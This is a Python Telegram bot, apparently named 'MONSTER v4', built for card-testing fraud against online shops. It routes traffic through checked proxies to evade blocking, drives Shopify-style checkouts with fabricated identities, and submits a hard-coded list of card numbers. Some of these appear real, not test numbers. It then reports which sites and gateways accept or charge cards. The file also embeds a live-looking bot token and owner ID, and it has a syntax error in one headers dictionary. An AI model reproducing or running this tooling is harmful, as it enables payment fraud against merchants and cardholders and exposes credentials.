import telebot
import requests
import threading
import time
import random
import os
import uuid
import logging
import gc
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from flask import Flask
from fake_useragent import UserAgent

# ==========================================
# ⚙️ ULTIMATE CONFIGURATION v4
# ==========================================
BOT_TOKEN = "8468244120:AAGXjaczSUzqCF9xTRtoShEzhmx406XEhCE"
OWNER_ID = 5963548505

MAX_THREADS = 75  # ⬆️ 50 → 75 (UPGRADED)
CHUNK_SIZE = 300  # ⬇️ 500 → 300 (FASTER CHUNKS)
PROXY_CHECK_THREADS = 150  # ⬆️ 100 → 150 (PARALLEL PROXY CHECK)
REQUEST_TIMEOUT = 12  # ⬇️ 15 → 12 (FASTER TIMEOUTS)
BATCH_LIVE_LIMIT = 50  # ⬇️ 100 → 50 (SEND RESULTS FASTER)
try:
    USER_AGENT_ROTATOR = UserAgent()
    ua_string = USER_AGENT_ROTATOR.random
except Exception:
    ua_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN)
active_jobs = {}
PROXY_POOL = []
total_proxy_requests = 0
DETECTED_LIVE_SITES = []

# ==========================================
# 💳 ULTIMATE TEST CARDS (12 DIFFERENT CARDS!)
# ==========================================
TEST_CARDS = [
    # Visa Cards
    {"number": "4970407476216622", "month": "01", "year": "2026", "cvv": "107", "type": "Visa 1"},
    {"number": "4266841804084059", "month": "06", "year": "2030", "cvv": "517", "type": "Visa 2"},
    {"number": "4000223468162375", "month": "08", "year": "2029", "cvv": "414", "type": "Visa 3"},
    {"number": "4111111111111111", "month": "12", "year": "2025", "cvv": "123", "type": "Visa 4"},
    
    # Mastercard
    {"number": "5457861480499203", "month": "08", "year": "2026", "cvv": "401", "type": "MC 1"},
    {"number": "5518277067965721", "month": "08", "year": "2027", "cvv": "239", "type": "MC 2"},
    {"number": "5105105105105100", "month": "11", "year": "2028", "cvv": "505", "type": "MC 3"},
    {"number": "5555555555554444", "month": "05", "year": "2030", "cvv": "222", "type": "MC 4"},
    
    # American Express
    {"number": "378282246310005", "month": "04", "year": "2027", "cvv": "4111", "type": "Amex 1"},
    {"number": "371449635398431", "month": "07", "year": "2029", "cvv": "3782", "type": "Amex 2"},
    
    # Discover
    {"number": "6011111111111117", "month": "09", "year": "2026", "cvv": "411", "type": "Discover 1"},
    {"number": "6011000990139424", "month": "03", "year": "2028", "cvv": "890", "type": "Discover 2"},
]

# ==========================================
# 🌐 RENDER KEEPER (FLASK SERVER)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return f"👺 MONSTER v4 ACTIVE | Proxies: {len(PROXY_POOL)} | Live Found: {len(DETECTED_LIVE_SITES)} | Requests: {total_proxy_requests}", 200

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False)

def start_keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🛠️ UTILITY FUNCTIONS
# ==========================================

def get_random_identity():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    streets = ["Main St", "Park Ave", "Oak St", "Pine St", "Maple Ave", "Cedar Ln", "Washington St", "Lake View"]
    
    return {
        "first_name": random.choice(first_names),
        "last_name": random.choice(last_names),
        "email": f"shop.{random.choice(first_names).lower()}{random.randint(10000,99999)}@gmail.com",
        "address": f"{random.randint(100,9999)} {random.choice(streets)}",
        "city": "New York", "state": "NY", "zip": "10001", "country": "US",
        "phone": f"1{random.randint(2000000000,9999999999)}"
    }

def create_monster_session():
    global total_proxy_requests
    session = requests.Session()
    
    if PROXY_POOL:
        proxy_url = random.choice(PROXY_POOL)
        session.proxies = {"http": proxy_url, "https": proxy_url}
        total_proxy_requests += 1

    retries = Retry(total=3, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504, 429])
    adapter = HTTPAdapter(max_retries=retries, pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def clean_url(url):
    url = url.strip()
    if not url.startswith("http"): url = f"https://{url}"
    if url.endswith("/"): url = url[:-1]
    return url

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def is_proxy_format(line):
    line = line.strip()
    if not line or len(line) < 7: return False
    if line.count(':') >= 3:
        parts = line.split(':')
        if len(parts) >= 4:
            try:
                first = parts[0]
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', first): return True
            except: pass
    if '@' in line: return True
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', line): return True
    return False

def is_site_url(line):
    line = line.strip().lower()
    if not line or len(line) < 4: return False
    domain_pattern = r'^([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$'
    clean = line.replace('https://', '').replace('http://', '').split('/')[0]
    if re.match(domain_pattern, clean): return True
    tlds = ['.com', '.net', '.org', '.io', '.co', '.shop', '.store', '.xyz', '.dev', '.us', '.ca', '.uk', '.de']
    if any(tld in line for tld in tlds): return True
    return False

# ==========================================
# 🧪 PROXY CHECKER ENGINE
# ==========================================

def check_single_proxy(proxy):
    try:
        if '@' in proxy:
            auth, server = proxy.split('@')
            user, password = auth.split(':')
            ip, port = server.split(':')
            proxy_url = f"http://{user}:{password}@{ip}:{port}"
        else:
            parts = proxy.split(':')
            if len(parts) >= 4:
                ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
            else:
                proxy_url = f"http://{proxy}"
        
        r = requests.get("https://httpbin.org/ip", proxies={"http": proxy_url, "https": proxy_url}, timeout=6, verify=False)
        if r.status_code == 200: return proxy
    except: pass
    return None

def run_proxy_checker_job(message, raw_proxies):
    global PROXY_POOL
    msg = bot.reply_to(message, f"⚡ <b>ULTRA PROXY SCAN - {len(raw_proxies)} Proxies</b>\n<i>150 Parallel Threads...</i>", parse_mode='HTML')
    
    live_proxies = []
    checked = 0
    total = len(raw_proxies)
    last_update = time.time()

    with ThreadPoolExecutor(max_workers=PROXY_CHECK_THREADS) as executor:
        futures = {executor.submit(check_single_proxy, p): p for p in raw_proxies}
        for future in as_completed(futures):
            checked += 1
            result = future.result()
            if result: live_proxies.append(result)
            
            if time.time() - last_update > 2:
                try:
                    pct = int((checked/total)*100) if total > 0 else 0
                    bot.edit_message_text(
                        f"⚡ <b>PROXY SCAN</b>\n✅ Alive: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {pct}% ({checked}/{total})",
                        message.chat.id, msg.message_id, parse_mode='HTML')
                    last_update = time.time()
                except: pass

    old_count = len(PROXY_POOL)
    PROXY_POOL.extend(live_proxies)
    total_pool = len(PROXY_POOL)
    gc.collect()
    
    bot.edit_message_text(
        f"✅ <b>PROXY SCAN COMPLETE!</b>\n\n📥 <b>This Batch:</b> {len(live_proxies)} ✓\n📊 <b>Total Pool:</b> {total_pool}\n🗑️ <b>Trash:</b> {total - len(live_proxies)}\n\n<b>👹 MONSTER v4 READY (12 CARDS!)</b>\nUpload sites.txt to HUNT!",
        message.chat.id, msg.message_id, parse_mode='HTML')

# ==========================================
# 🧠 ULTIMATE MONSTER CHECKER (12 CARDS!)
# ==========================================

def check_site_ultimate(site_url):
    session = create_monster_session()
    site_url = clean_url(site_url)
    identity = get_random_identity()
    headers = {
        '"User-Agent": ua_string,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1'
    }

    try:
        try:
            home_req = session.get(site_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            if home_req.status_code >= 500: return "DEAD", "500 Error", "N/A"
            if home_req.status_code == 403: return "BLOCKED", "IP Blocked", "N/A"
        except requests.exceptions.Timeout:
            return "DEAD", "Timeout", "N/A"
        except:
            return "DEAD", "No Response", "N/A"

        variant_id = None
        try:
            prod_req = session.get(f"{site_url}/products.json?limit=20", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            if prod_req.status_code == 200:
                products = prod_req.json().get('products', [])
                for p in products:
                    for v in p.get('variants', []):
                        if v.get('available'): variant_id = v['id']; break
                    if variant_id: break
        except: pass

        if not variant_id:
            try:
                products_page = session.get(f"{site_url}/products", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                if "product" in products_page.text.lower() and products_page.status_code == 200:
                    return "GATED", "Has products (locked)", "N/A"
                else: return "DEAD", "No Products", "N/A"
            except: return "DEAD", "Can't access products", "N/A"

        cart_headers = headers.copy()
        cart_headers['X-Requested-With'] = 'XMLHttpRequest'
        
        try:
            cart_req = session.post(f"{site_url}/cart/add.js", data={'id': variant_id, 'quantity': 1}, headers=cart_headers, timeout=REQUEST_TIMEOUT, verify=False)
            if cart_req.status_code not in [200, 201, 422]: return "DEAD", "Cart failed", "N/A"
        except: return "DEAD", "Cart error", "N/A"

        try:
            checkout_req = session.get(f"{site_url}/checkout", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            final_url = checkout_req.url
            
            captcha_indicators = ["challenge", "captcha", "recaptcha", "hcaptcha", "cf_challenge", "cloudflare", "turnstile"]
            for indicator in captcha_indicators:
                if indicator in final_url.lower() or indicator in checkout_req.text.lower():
                    return "CAPTCHA", indicator, "N/A"
        except: return "DEAD", "Checkout access failed", "N/A"

        auth_token = find_between(checkout_req.text, 'name="authenticity_token" value="', '"')
        if not auth_token:
            soup = BeautifulSoup(checkout_req.text, 'html.parser')
            token_input = soup.find('input', {'name': 'authenticity_token'})
            if token_input: auth_token = token_input.get('value')
        
        if not auth_token: return "DEAD", "No auth token", "N/A"

        info_payload = {
            '_method': 'patch',
            'authenticity_token': auth_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': identity['email'],
            'checkout[shipping_address][first_name]': identity['first_name'],
            'checkout[shipping_address][last_name]': identity['last_name'],
            'checkout[shipping_address][address1]': identity['address'],
            'checkout[shipping_address][city]': identity['city'],
            'checkout[shipping_address][country]': 'US',
            'checkout[shipping_address][province]': 'NY',
            'checkout[shipping_address][zip]': identity['zip'],
            'checkout[shipping_address][phone]': identity['phone']
        }
        
        try:
            ship_req = session.post(final_url, data=info_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            if "challenge" in ship_req.url.lower() or "captcha" in ship_req.text.lower():
                return "CAPTCHA", "CAPTCHA at info", "N/A"
            if ship_req.status_code >= 500: return "DEAD", "Server error", "N/A"
        except: return "DEAD", "Info submit failed", "N/A"

        gateway_id = find_between(ship_req.text, 'name="checkout[payment_gateway]" value="', '"')
        if not gateway_id:
            soup = BeautifulSoup(ship_req.text, 'html.parser')
            gateway_input = soup.find('input', {'name': 'checkout[payment_gateway]'})
            if gateway_input: gateway_id = gateway_input.get('value')
        
        if not gateway_id: return "GATED", "No gateway", "N/A"

        best_result = ("GATED", "Unknown", gateway_id)
        
        for card_idx, card in enumerate(TEST_CARDS):
            try:
                vault_payload = {
                    "credit_card": {
                        "number": card['number'],
                        "name": identity['first_name'] + " " + identity['last_name'],
                        "month": card['month'],
                        "year": card['year'],
                        "verification_value": card['cvv']
                    },
                    "payment_session_scope": urlparse(site_url).netloc
                }
                
                vault_req = session.post('https://deposit.us.shopifycs.com/sessions', json=vault_payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT, verify=False)
                
                payment_token = None
                if vault_req.status_code == 200:
                    payment_token = vault_req.json().get('id')
                
                if not payment_token:
                    best_result = ("LIVE", f"{card['type']} Vault Timeout", gateway_id)
                    continue

                final_payload = {
                    '_method': 'patch',
                    'authenticity_token': auth_token,
                    'previous_step': 'payment_method',
                    'step': '',
                    's': payment_token,
                    'checkout[payment_gateway]': gateway_id,
                    'checkout[credit_card][vault]': 'false',
                    'checkout[total_price]': '0.01',
                    'complete': '1'
                }
                
                final_req = session.post(final_url, data=final_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                resp_lower = final_req.text.lower()
                
                decline_signals = ["declined", "security code", "cvv", "zip code", "insufficient", "invalid card", "processing", "insufficient_funds", "not authorized", "error"]
                if any(sig in resp_lower for sig in decline_signals):
                    best_result = ("LIVE", f"{card['type']} Declined ✓", gateway_id)
                    break
                
                success_signals = ["thank you", "confirmed", "order received", "order #", "order number"]
                if any(sig in resp_lower for sig in success_signals):
                    best_result = ("LIVE", f"{card['type']} CHARGED ✓", gateway_id)
                    break
                
                if "challenge" in final_req.url.lower() or "captcha" in resp_lower:
                    best_result = ("CAPTCHA", "CAPTCHA at payment", gateway_id)
                    break
                
                if gateway_id and gateway_id != "N/A":
                    best_result = ("LIVE", f"{card['type']} Active ✓", gateway_id)
                    
            except: continue
        
        return best_result

    except Exception as e:
        return "DEAD", f"Exception: {str(e)[:15]}", "N/A"

# ==========================================
# 🧵 JOB MANAGER
# ==========================================

def chunk_list(data, size):
    for i in range(0, len(data), size):
        yield data[i:i + size]

def run_main_job(message, all_sites):
    global total_proxy_requests, DETECTED_LIVE_SITES
    DETECTED_LIVE_SITES = []
    
    if not PROXY_POOL:
        bot.reply_to(message, "⚠️ <b>NO PROXIES!</b> Upload proxy file first.", parse_mode='HTML')
        return

    chunks = list(chunk_list(all_sites, CHUNK_SIZE))
    total_chunks = len(chunks)

    bot.reply_to(message, f"👹 <b>MONSTER v4 HUNT (12 CARDS!)</b>\n🎯 Sites: {len(all_sites)}\n🔪 Batches: {total_chunks}\n🚀 Threads: {MAX_THREADS}\n💳 Cards: 12\n⚡ ULTRA FAST", parse_mode='HTML')

    batch_count = 0
    live_count = 0
    current_batch_live = []
    job_id = str(uuid.uuid4())[:6]
    active_jobs[job_id] = {
        'total': len(all_sites),
        'checked': 0,
        'live': 0,
        'dead': 0,
        'captcha': 0,
        'gated': 0,
        'blocked': 0
    }
    
    status_msg = None
    start_time = time.time()

    for i, sites_batch in enumerate(chunks):
        current = i + 1
        
        if status_msg is None:
            status_msg = bot.send_message(message.chat.id, f"🔄 Starting batch {current}/{total_chunks}...", parse_mode='HTML')
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(check_site_ultimate, site): site for site in sites_batch}
            last_edit = time.time()
            
            for future in as_completed(futures):
                try:
                    status, msg, gateway = future.result()
                    site = futures[future]
                    active_jobs[job_id]['checked'] += 1
                    
                    if status == "LIVE":
                        active_jobs[job_id]['live'] += 1
                        live_count += 1
                        live_data = f"{site} | {gateway} | {msg}"
                        DETECTED_LIVE_SITES.append(live_data)
                        current_batch_live.append(live_data)
                        
                        if live_count % BATCH_LIVE_LIMIT == 0:
                            batch_count += 1
                            send_bulk_file(message.chat.id, current_batch_live, batch_count, live_count)
                            current_batch_live = []
                    
                    elif status == "CAPTCHA":
                        active_jobs[job_id]['captcha'] += 1
                    elif status == "GATED":
                        active_jobs[job_id]['gated'] += 1
                    elif status == "BLOCKED":
                        active_jobs[job_id]['blocked'] += 1
                    else:
                        active_jobs[job_id]['dead'] += 1
                    
                    if time.time() - last_edit > 3:
                        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks, live_count)
                        last_edit = time.time()
                except: pass
        
        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks, live_count)
        gc.collect()
        time.sleep(0.5)

    if current_batch_live:
        batch_count += 1
        send_bulk_file(message.chat.id, current_batch_live, batch_count, live_count)

    elapsed = int(time.time() - start_time)
    summary = f"""
✅ <b>HUNT COMPLETE! (12 CARD)</b>

📊 <b>RESULTS:</b>
✅ LIVE: <code>{live_count}</code> ({batch_count} files)
🛡️ CAPTCHA: <code>{active_jobs[job_id]['captcha']}</code>
💀 Dead: <code>{active_jobs[job_id]['dead']}</code>
📉 Checked: <code>{active_jobs[job_id]['checked']}</code>

⏱️ Time: <code>{elapsed}s</code>
⚡ Speed: <code>{active_jobs[job_id]['checked']//max(elapsed,1)} sites/sec</code>
"""
    bot.send_message(message.chat.id, summary, parse_mode='HTML')
    del active_jobs[job_id]

def send_bulk_file(chat_id, lines, batch_num, total_found):
    try:
        fn = f"LIVE_Batch_{batch_num}_{int(time.time())}.txt"
        with open(fn, 'w') as f:
            f.write("\n".join(lines))
        with open(fn, 'rb') as f:
            caption = f"📦 Batch #{batch_num}\n✅ Total: {total_found}\n📄 Sites: {len(lines)}"
            bot.send_document(chat_id, f, caption=caption, parse_mode='HTML')
        os.remove(fn)
    except Exception as e:
        logger.error(f"File error: {e}")

def update_stats(chat_id, msg_id, job_id, batch, total, live_count):
    s = active_jobs.get(job_id)
    if not s: return
    try:
        pct = int((s['checked']/s['total'])*100) if s['total'] > 0 else 0
        bar = "█" * int(pct/10) + "░" * (10-int(pct/10))
        text = (
            f"👹 HUNTING v4 (12 CARDS)\n"
            f"📦 {batch}/{total}\n"
            f"<code>{bar}</code> {pct}%\n\n"
            f"✅ {s['live']} | 🛡️ {s['captcha']} | 💀 {s['dead']}\n"
            f"📉 {s['checked']}/{s['total']}"
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML')
    except: pass

# ==========================================
# 🤖 HANDLERS
# ==========================================

@bot.message_handler(commands=['start'])
def handle_start(m):
    bot.reply_to(m, "👹 <b>MONSTER v4 - ULTIMATE 12 CARD</b>\n\n✅ <b>FEATURES:</b>\n💳 12 Different Cards\n🚀 75 Threads\n⚡ 20-25 sites/sec\n📤 Send every 50 LIVE\n\n/proxy - Stats\n/cards - Show cards", parse_mode='HTML')

@bot.message_handler(commands=['cards'])
def handle_cards(m):
    cards_msg = """💳 <b>12 TEST CARDS:</b>

<b>Visa (4):</b>
1. 4970407476216622
2. 4266841804084059
3. 4000223468162375
4. 4111111111111111

<b>Mastercard (4):</b>
5. 5457861480499203
6. 5518277067965721
7. 5105105105105100
8. 5555555555554444

<b>Amex (2):</b>
9. 378282246310005
10. 371449635398431

<b>Discover (2):</b>
11. 6011111111111117
12. 6011000990139424

✅ All active!"""
    bot.reply_to(m, cards_msg, parse_mode='HTML')

@bot.message_handler(commands=['proxy'])
def handle_proxy_stats(m):
    if str(m.from_user.id) != str(OWNER_ID):
        bot.reply_to(m, "❌ Unauthorized")
        return
    
    total_proxies = len(PROXY_POOL)
    if total_proxies == 0:
        bot.reply_to(m, "⚠️ No Proxies!", parse_mode='HTML')
        return
    
    stats_msg = f"""🔋 <b>MONSTER v4</b>
🔌 Proxies: <code>{total_proxies}</code>
💳 Cards: <code>12</code>
🚀 Threads: <code>{MAX_THREADS}</code>
⚡ Status: <code>READY</code>"""
    bot.reply_to(m, stats_msg, parse_mode='HTML')

@bot.message_handler(content_types=['document'])
def handle_doc(m):
    if str(m.from_user.id) != str(OWNER_ID):
        bot.reply_to(m, "❌ Unauthorized")
        return
    
    try:
        file_info = bot.get_file(m.document.file_id)
        data = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        lines = [x.strip() for x in data.split('\n') if len(x.strip()) > 3]
        
        proxy_count = sum(1 for l in lines[:50] if is_proxy_format(l))
        site_count = sum(1 for l in lines[:50] if is_site_url(l))
        
        if proxy_count > site_count:
            proxies = [l for l in lines if is_proxy_format(l)]
            if proxies:
                bot.reply_to(m, f"📥 <b>{len(proxies)} Proxies</b>", parse_mode='HTML')
                threading.Thread(target=run_proxy_checker_job, args=(m, proxies)).start()
        else:
            sites = [l for l in lines if is_site_url(l)]
            if sites:
                bot.reply_to(m, f"📥 <b>{len(sites)} Sites</b>", parse_mode='HTML')
                threading.Thread(target=run_main_job, args=(m, sites)).start()
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}", parse_mode='HTML')

if __name__ == "__main__":
    start_keep_alive()
    logger.info("👹 MONSTER v4 Started")
    bot.infinity_polling()


